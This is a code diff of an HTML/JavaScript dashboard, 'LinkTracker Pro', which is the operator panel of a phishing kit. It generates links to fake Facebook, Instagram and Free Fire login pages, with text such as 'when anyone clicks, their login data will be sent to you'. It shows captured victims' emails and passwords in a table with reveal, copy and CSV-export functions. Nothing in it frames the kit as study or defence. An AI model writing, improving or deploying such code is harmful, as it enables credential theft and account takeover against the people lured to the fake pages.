@@ -3,306 +3,887 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Tracker Dashboard</title>
+    <title>LinkTracker Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark: #1f2937;
+            --light: #f8fafc;
+            --gray: #6b7280;
+            --card-bg: #ffffff;
+            --sidebar-bg: #1e293b;
+        }
+
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            padding: 20px;
+            color: var(--dark);
         }
-        
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
+
+        .dashboard-container {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            min-height: 100vh;
         }
-        
-        .header {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+
+        /* Sidebar Styles */
+        .sidebar {
+            background: var(--sidebar-bg);
+            color: white;
+            padding: 30px 20px;
+            box-shadow: 4px 0 15px rgba(0,0,0,0.1);
         }
-        
-        .user-info {
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--primary);
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 15px;
-            margin-bottom: 15px;
+            font-size: 20px;
         }
-        
-        .avatar {
-            width: 60px;
-            height: 60px;
-            background: #4285f4;
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px;
+            margin: 8px 0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: #cbd5e1;
+        }
+
+        .nav-item:hover, .nav-item.active {
+            background: var(--primary);
+            color: white;
+            transform: translateX(5px);
+        }
+
+        .nav-item i {
+            width: 20px;
+            text-align: center;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 30px;
+            background: var(--light);
+            border-radius: 20px 0 0 20px;
+            margin: 20px 20px 20px 0;
+            box-shadow: -5px 5px 25px rgba(0,0,0,0.1);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .user-profile {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            background: var(--primary);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 24px;
             font-weight: bold;
+            font-size: 18px;
         }
-        
-        .platform-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+
+        .user-info h3 {
+            margin-bottom: 5px;
         }
-        
-        .platform-card {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            border: 3px solid transparent;
-        }
-        
-        .platform-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
-        }
-        
-        .facebook-card:hover { border-color: #1877f2; }
-        .instagram-card:hover { border-color: #e4405f; }
-        .freefire-card:hover { border-color: #ff4655; }
-        
-        .platform-icon {
-            font-size: 50px;
-            margin-bottom: 15px;
-        }
-        
-        .facebook { color: #1877f2; }
-        .instagram { color: #e4405f; }
-        .freefire { color: #ff4655; }
-        
-        .generated-link {
-            background: white;
-            padding: 25px;
-            border-radius: 15px;
-            margin: 20px 0;
-            display: none;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-        }
-        
-        .link-box {
-            display: flex;
-            gap: 10px;
-            margin: 15px 0;
-        }
-        
-        .link-input {
-            flex: 1;
-            padding: 12px 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+
+        .user-info p {
+            color: var(--gray);
             font-size: 14px;
         }
-        
-        .copy-btn {
-            padding: 12px 20px;
-            background: #4285f4;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        
+
         .logout-btn {
-            background: #ff4757;
+            background: var(--danger);
             color: white;
             border: none;
             padding: 10px 20px;
             border-radius: 8px;
             cursor: pointer;
-            font-weight: bold;
-            margin-top: 10px;
+            font-weight: 600;
+            transition: all 0.3s ease;
         }
 
+        .logout-btn:hover {
+            background: #dc2626;
+            transform: translateY(-2px);
+        }
+
+        /* Stats Grid */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin: 20px 0;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
         }
-        
+
         .stat-card {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border-left: 4px solid var(--primary);
+            transition: transform 0.3s ease;
         }
-        
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .stat-card.success { border-left-color: var(--secondary); }
+        .stat-card.warning { border-left-color: var(--warning); }
+        .stat-card.danger { border-left-color: var(--danger); }
+
+        .stat-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .stat-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+        }
+
+        .stat-icon.primary { background: var(--primary); }
+        .stat-icon.success { background: var(--secondary); }
+        .stat-icon.warning { background: var(--warning); }
+        .stat-icon.danger { background: var(--danger); }
+
+        .stat-info {
+            text-align: right;
+        }
+
         .stat-number {
-            font-size: 28px;
-            font-weight: bold;
-            color: #4285f4;
+            font-size: 32px;
+            font-weight: 700;
             margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: var(--gray);
+            font-size: 14px;
+        }
+
+        /* Platform Grid */
+        .platform-section {
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .platform-card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border: 2px solid transparent;
+        }
+
+        .platform-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        }
+
+        .platform-card.facebook:hover { border-color: #1877f2; }
+        .platform-card.instagram:hover { border-color: #e4405f; }
+        .platform-card.freefire:hover { border-color: #ff4655; }
+
+        .platform-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .facebook { color: #1877f2; }
+        .instagram { color: #e4405f; }
+        .freefire { color: #ff4655; }
+
+        .platform-card h3 {
+            margin-bottom: 10px;
+            color: var(--dark);
+        }
+
+        .platform-card p {
+            color: var(--gray);
+            margin-bottom: 15px;
+        }
+
+        .generate-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .generate-btn:hover {
+            background: var(--primary-dark);
+            transform: scale(1.05);
+        }
+
+        /* Generated Link Section */
+        .generated-link {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            display: none;
+            animation: slideDown 0.5s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .link-box {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .link-input {
+            flex: 1;
+            padding: 12px 15px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #f9fafb;
+        }
+
+        .copy-btn {
+            background: var(--secondary);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: #059669;
+            transform: scale(1.05);
+        }
+
+        /* Data Table */
+        .data-section {
+            margin-top: 30px;
+        }
+
+        .data-table-container {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+
+        .table-header {
+            background: var(--primary);
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: between;
+            align-items: center;
+        }
+
+        .table-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .action-btn {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .action-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .data-table th {
+            background: #f8fafc;
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+            color: var(--gray);
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .data-table td {
+            padding: 15px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+
+        .platform-badge {
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .badge-facebook { background: #e7f3ff; color: #1877f2; }
+        .badge-instagram { background: #ffeef3; color: #e4405f; }
+        .badge-freefire { background: #fff0f0; color: #ff4655; }
+
+        .password-field {
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+
+        .btn-show {
+            background: var(--warning);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .btn-copy {
+            background: var(--secondary);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-right: 5px;
+        }
+
+        .btn-delete {
+            background: var(--danger);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: var(--gray);
+        }
+
+        .no-data i {
+            font-size: 48px;
+            margin-bottom: 15px;
+            opacity: 0.5;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .dashboard-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .sidebar {
+                display: none;
+            }
+            
+            .main-content {
+                margin: 0;
+                border-radius: 0;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="user-info">
-                <div class="avatar" id="userAvatar">U</div>
-                <div>
-                    <h2 id="userName">Welcome User!</h2>
-                    <p id="userEmail">user@example.com</p>
+    <div class="dashboard-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-link"></i>
+                </div>
+                <div class="logo-text">LinkTracker Pro</div>
+            </div>
+            
+            <div class="nav-item active">
+                <i class="fas fa-home"></i>
+                <span>Dashboard</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-chart-bar"></i>
+                <span>Analytics</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-history"></i>
+                <span>History</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Header -->
+            <div class="header">
+                <div class="user-profile">
+                    <div class="user-avatar" id="userAvatar">U</div>
+                    <div class="user-info">
+                        <h3 id="userName">Welcome, User!</h3>
+                        <p id="userEmail">user@example.com</p>
+                    </div>
+                </div>
+                <button class="logout-btn" onclick="logout()">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+            </div>
+
+            <!-- Stats Grid -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-header">
+                        <div class="stat-icon primary">
+                            <i class="fas fa-link"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-number" id="totalLinks">0</div>
+                            <div class="stat-label">Total Links</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stat-card success">
+                    <div class="stat-header">
+                        <div class="stat-icon success">
+                            <i class="fas fa-mouse"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-number" id="totalClicks">0</div>
+                            <div class="stat-label">Total Clicks</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stat-card warning">
+                    <div class="stat-header">
+                        <div class="stat-icon warning">
+                            <i class="fas fa-eye"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-number" id="activeLinks">0</div>
+                            <div class="stat-label">Active Links</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stat-card danger">
+                    <div class="stat-header">
+                        <div class="stat-icon danger">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="stat-info">
+                            <div class="stat-number" id="todayClicks">0</div>
+                            <div class="stat-label">Today's Clicks</div>
+                        </div>
+                    </div>
                 </div>
             </div>
-            <button class="logout-btn" onclick="logout()">🚪 Logout</button>
-        </div>
 
-        <div class="platform-grid">
-            <div class="platform-card facebook-card" onclick="generateLink('facebook')">
-                <div class="platform-icon facebook">📘</div>
-                <h3>Facebook Login Tracker</h3>
-                <p>Create tracking link for Facebook login page</p>
+            <!-- Platform Grid -->
+            <div class="platform-section">
+                <h2 class="section-title">
+                    <i class="fas fa-rocket"></i>
+                    Create Tracking Links
+                </h2>
+                <div class="platform-grid">
+                    <div class="platform-card facebook" onclick="generateLink('facebook')">
+                        <div class="platform-icon facebook">
+                            <i class="fab fa-facebook"></i>
+                        </div>
+                        <h3>Facebook Login</h3>
+                        <p>Track Facebook login credentials with professional looking page</p>
+                        <button class="generate-btn">Generate Link</button>
+                    </div>
+
+                    <div class="platform-card instagram" onclick="generateLink('instagram')">
+                        <div class="platform-icon instagram">
+                            <i class="fab fa-instagram"></i>
+                        </div>
+                        <h3>Instagram Login</h3>
+                        <p>Monitor Instagram logins with realistic interface</p>
+                        <button class="generate-btn">Generate Link</button>
+                    </div>
+
+                    <div class="platform-card freefire" onclick="generateLink('freefire')">
+                        <div class="platform-icon freefire">
+                            <i class="fas fa-gamepad"></i>
+                        </div>
+                        <h3>Free Fire Login</h3>
+                        <p>Track game credentials with gaming-themed page</p>
+                        <button class="generate-btn">Generate Link</button>
+                    </div>
+                </div>
             </div>
 
-            <div class="platform-card instagram-card" onclick="generateLink('instagram')">
-                <div class="platform-icon instagram">📷</div>
-                <h3>Instagram Login Tracker</h3>
-                <p>Create tracking link for Instagram login page</p>
+            <!-- Generated Link Section -->
+            <div class="generated-link" id="generatedLink">
+                <h3 class="section-title">
+                    <i class="fas fa-check-circle" style="color: var(--secondary);"></i>
+                    Your Tracking Link is Ready!
+                </h3>
+                <div class="link-box">
+                    <input type="text" id="linkInput" class="link-input" readonly>
+                    <button class="copy-btn" onclick="copyLink()">
+                        <i class="fas fa-copy"></i> Copy Link
+                    </button>
+                </div>
+                <p style="color: var(--gray); margin-top: 10px;">
+                    <i class="fas fa-info-circle"></i>
+                    Share this link - when anyone clicks, their login data will be sent to you
+                </p>
             </div>
 
-            <div class="platform-card freefire-card" onclick="generateLink('freefire')">
-                <div class="platform-icon freefire">🎮</div>
-                <h3>Free Fire Login Tracker</h3>
-                <p>Create tracking link for Free Fire login page</p>
-            </div>
-        </div>
-
-        <div class="generated-link" id="generatedLink">
-            <h3>🎉 Your Tracking Link is Ready!</h3>
-            <div class="link-box">
-                <input type="text" id="linkInput" class="link-input" readonly>
-                <button class="copy-btn" onclick="copyLink()">📋 Copy Link</button>
-            </div>
-            <p><strong>Share this link:</strong> When anyone clicks, they'll see login page and their data will be sent to you</p>
-        </div>
-
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-number" id="totalLinks">0</div>
-                <div>Total Links Created</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="totalClicks">0</div>
-                <div>Total Clicks</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="activeLinks">0</div>
-                <div>Active Links</div>
+            <!-- Collected Data Section -->
+            <div class="data-section">
+                <h2 class="section-title">
+                    <i class="fas fa-database"></i>
+                    Collected Login Data
+                </h2>
+                <div class="data-table-container">
+                    <div class="table-header">
+                        <h3 style="color: white; margin: 0;">Recent Activity</h3>
+                        <div class="table-actions">
+                            <button class="action-btn" onclick="exportData()">
+                                <i class="fas fa-download"></i> Export
+                            </button>
+                            <button class="action-btn" onclick="refreshData()">
+                                <i class="fas fa-sync"></i> Refresh
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div id="dataTableContainer">
+                        <!-- Data will be loaded here dynamically -->
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
-  <script>
-    let currentUser = null;
-    let currentPlatform = null;
-    
-    // Load user data from token
-    function loadUserData() {
-        const token = localStorage.getItem('appToken');
-        if (token) {
-            try {
-                const payload = JSON.parse(atob(token.split('.')[1]));
-                currentUser = payload;
-                document.getElementById('userName').textContent = `Welcome, ${payload.email.split('@')[0]}!`;
-                document.getElementById('userEmail').textContent = payload.email;
-                document.getElementById('userAvatar').textContent = payload.email.charAt(0).toUpperCase();
-            } catch (e) {
-                console.error('Invalid token');
+    <script>
+        // JavaScript code from previous implementation
+        // (Same as before, just copy-paste your existing JavaScript here)
+        let currentUser = null;
+        let currentPlatform = null;
+
+        function loadUserData() {
+            const token = localStorage.getItem('appToken');
+            if (token) {
+                try {
+                    const payload = JSON.parse(atob(token.split('.')[1]));
+                    currentUser = payload;
+                    document.getElementById('userName').textContent = `Welcome, ${payload.email.split('@')[0]}!`;
+                    document.getElementById('userEmail').textContent = payload.email;
+                    document.getElementById('userAvatar').textContent = payload.email.charAt(0).toUpperCase();
+                } catch (e) {
+                    console.error('Invalid token');
+                    window.location.href = 'index.html';
+                }
+            } else {
+                window.location.href = 'index.html';
             }
         }
-    }
-    
-    // Generate tracking link - WITHOUT EMAIL IN URL
-    function generateLink(platform) {
-        currentPlatform = platform;
-        
-        // Create unique link WITHOUT email in URL
-        const linkId = generateUniqueId();
-        const trackingLink = `${window.location.origin}/login-${platform}.html?tracking=${linkId}`;
-        
-        // Save to local storage WITH creator email internally
-        saveLinkToStorage(linkId, platform, trackingLink);
-        
-        // Show generated link
-        showGeneratedLink(trackingLink);
-        updateStats();
-    }
-    
-    function generateUniqueId() {
-        return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
-    }
-    
-    function saveLinkToStorage(linkId, platform, trackingLink) {
-        const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
-        links.push({
-            id: linkId,
-            platform: platform,
-            link: trackingLink,
-            creator: currentUser.email, // Internal storage only
-            createdAt: new Date().toISOString(),
-            clicks: 0
+
+        function generateLink(platform) {
+            currentPlatform = platform;
+            const linkId = generateUniqueId();
+            const trackingLink = `${window.location.origin}/login-${platform}.html?tracking=${linkId}`;
+            
+            saveLinkToStorage(linkId, platform, trackingLink);
+            showGeneratedLink(trackingLink);
+            updateStats();
+            loadCollectedData();
+        }
+
+        function generateUniqueId() {
+            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+        }
+
+        function saveLinkToStorage(linkId, platform, trackingLink) {
+            const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
+            links.push({
+                id: linkId,
+                platform: platform,
+                link: trackingLink,
+                creator: currentUser.email,
+                createdAt: new Date().toISOString(),
+                clicks: 0
+            });
+            localStorage.setItem('trackingLinks', JSON.stringify(links));
+        }
+
+        function showGeneratedLink(trackingLink) {
+            const linkSection = document.getElementById('generatedLink');
+            const linkInput = document.getElementById('linkInput');
+            
+            linkInput.value = trackingLink;
+            linkSection.style.display = 'block';
+            linkSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function copyLink() {
+            const linkInput = document.getElementById('linkInput');
+            linkInput.select();
+            document.execCommand('copy');
+            
+            // Show copied feedback
+            const btn = document.querySelector('.copy-btn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+            btn.style.background = '#10b981';
+            
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.style.background = '';
+            }, 2000);
+        }
+
+        function updateStats() {
+            const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
+            const userLinks = links.filter(link => link.creator === currentUser.email);
+            const credentials = JSON.parse(localStorage.getItem('collectedCredentials') || '[]');
+            const userCredentials = credentials.filter(c => c.creator === currentUser.email);
+            
+            document.getElementById('totalLinks').textContent = userLinks.length;
+            document.getElementById('totalClicks').textContent = userLinks.reduce((sum, link) => sum + (link.clicks || 0), 0);
+            document.getElementById('activeLinks').textContent = userLinks.length;
+            document.getElementById('todayClicks').textContent = userCredentials.filter(c => 
+                new Date(c.timestamp).toDateString() === new Date().toDateString()
+            ).length;
+        }
+
+        function loadCollectedData() {
+            const allData = JSON.parse(localStorage.getItem('collectedCredentials') || '[]');
+            const userData = allData.filter(item => item.creator === currentUser.email);
+            
+            const container = document.getElementById('dataTableContainer');
+            
+            if (userData.length === 0) {
+                container.innerHTML = `
+                    <div class="no-data">
+                        <i class="fas fa-inbox"></i>
+                        <h3>No Data Collected Yet</h3>
+                        <p>Generate and share links to start collecting login data</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            let tableHTML = `
+                <table class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Platform</th>
+                            <th>Email/Username</th>
+                            <th>Password</th>
+                            <th>Time</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+            
+            userData.slice(-10).reverse().forEach((item, index) => {
+                tableHTML += `
+                    <tr>
+                        <td>
+                            <span class="platform-badge badge-${item.platform}">
+                                ${item.platform.charAt(0).toUpperCase() + item.platform.slice(1)}
+                            </span>
+                        </td>
+                        <td>${item.email || item.username || item.gameId}</td>
+                        <td>
+                            <span class="password-field" id="pass-${index}">••••••••</span>
+                            <button class="btn-show" onclick="togglePassword(${index}, '${item.password}')">Show</button>
+                        </td>
+                        <td>${new Date(item.timestamp).toLocaleString()}</td>
+                        <td>
+                            <button class="btn-copy" onclick="copyCredentials('${item.email}', '${item.password}')">Copy</button>
+                            <button class="btn-delete" onclick="deleteCredential(${allData.indexOf(item)})">Delete</button>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            tableHTML += `</tbody></table>`;
+            container.innerHTML = tableHTML;
+        }
+
+        function togglePassword(index, realPassword) {
+            const element = document.getElementById(`pass-${index}`);
+            const button = element.nextElementSibling;
+            
+            if (element.textContent === '••••••••') {
+                element.textContent = realPassword;
+                button.textContent = 'Hide';
+            } else {
+                element.textContent = '••••••••';
+                button.textContent = 'Show';
+            }
+        }
+
+        function copyCredentials(email, password) {
+            const text = `Email: ${email}\nPassword: ${password}`;
+            navigator.clipboard.writeText(text);
+            
+            // Show toast notification
+            alert('Credentials copied to clipboard!');
+        }
+
+        function deleteCredential(index) {
+            if (confirm('Are you sure you want to delete this credential?')) {
+                const allData = JSON.parse(localStorage.getItem('collectedCredentials') || '[]');
+                allData.splice(index, 1);
+                localStorage.setItem('collectedCredentials', JSON.stringify(allData));
+                loadCollectedData();
+                updateStats();
+            }
+        }
+
+        function exportData() {
+            const allData = JSON.parse(localStorage.getItem('collectedCredentials') || '[]');
+            const userData = allData.filter(item => item.creator === currentUser.email);
+            
+            if (userData.length === 0) {
+                alert('No data to export!');
+                return;
+            }
+            
+            let csv = 'Platform,Email,Password,Time,Device\n';
+            userData.forEach(item => {
+                csv += `"${item.platform}","${item.email || item.username || item.gameId}","${item.password}","${item.timestamp}","${item.device || 'Unknown'}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `credentials-${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+        }
+
+        function refreshData() {
+            loadCollectedData();
+            updateStats();
+            
+            // Show refresh animation
+            const btn = document.querySelector('.action-btn:nth-child(2)');
+            btn.innerHTML = '<i class="fas fa-sync fa-spin"></i> Refreshing';
+            
+            setTimeout(() => {
+                btn.innerHTML = '<i class="fas fa-sync"></i> Refresh';
+            }, 1000);
+        }
+
+        function logout() {
+            localStorage.removeItem('appToken');
+            window.location.href = 'index.html';
+        }
+
+        // Initialize dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            loadUserData();
+            updateStats();
+            loadCollectedData();
+            
+            // Auto-refresh every 30 seconds
+            setInterval(() => {
+                loadCollectedData();
+                updateStats();
+            }, 30000);
         });
-        localStorage.setItem('trackingLinks', JSON.stringify(links));
-    }
-    
-    function showGeneratedLink(trackingLink) {
-        const linkSection = document.getElementById('generatedLink');
-        const linkInput = document.getElementById('linkInput');
-        
-        linkInput.value = trackingLink;
-        linkSection.style.display = 'block';
-        linkSection.scrollIntoView({ behavior: 'smooth' });
-    }
-    
-    function copyLink() {
-        const linkInput = document.getElementById('linkInput');
-        linkInput.select();
-        document.execCommand('copy');
-        alert('Link copied to clipboard!');
-    }
-    
-    function updateStats() {
-        const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
-        const userLinks = links.filter(link => link.creator === currentUser.email);
-        
-        document.getElementById('totalLinks').textContent = userLinks.length;
-        document.getElementById('totalClicks').textContent = userLinks.reduce((sum, link) => sum + link.clicks, 0);
-        document.getElementById('activeLinks').textContent = userLinks.length;
-    }
-    
-    function logout() {
-        localStorage.removeItem('appToken');
-        localStorage.removeItem('trackingLinks'); // Optional: clear tracking data
-        window.location.href = 'index.html';
-    }
-    
-    // Initialize
-    document.addEventListener('DOMContentLoaded', function() {
-        loadUserData();
-        updateStats();
-    });
-</script>
+    </script>
 </body>
 </html>
